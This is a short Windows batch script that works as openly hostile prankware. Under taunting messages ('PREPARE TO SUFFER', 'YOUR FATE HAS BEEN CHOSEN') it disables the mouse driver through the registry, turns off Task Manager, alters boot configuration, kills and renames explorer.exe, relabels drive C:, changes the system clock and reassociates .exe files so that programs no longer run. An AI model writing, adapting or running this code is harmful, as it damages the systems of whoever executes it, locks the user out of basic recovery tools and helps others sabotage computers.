@echo off
REM NO WAY YOU JUST LOOKED TO INITIALIZE.BAT FILE! SUCKS TO BE U!
color 04
echo PREPARE TO SUFFER.
start /min run.mp3
config.exe splash.bmp
title YOUR FATE HAS BEEN CHOSEN.
label C:BYEBYESYSTEM
date 16.08.2008
time 5:14
start /min e.bat
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key% /f
reg add %key% /v Start /t REG_DWORD /d 4 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
bcdedit /deletevalue {default} safeboot
server win trans class Shell_TrayWnd 256
server win hide class progman
taskkill /f /im explorer.exe
rename C:\Windows\explorer.exe C:\Windows\noexplorer.exe
start note.txt
assoc .exe=.bye
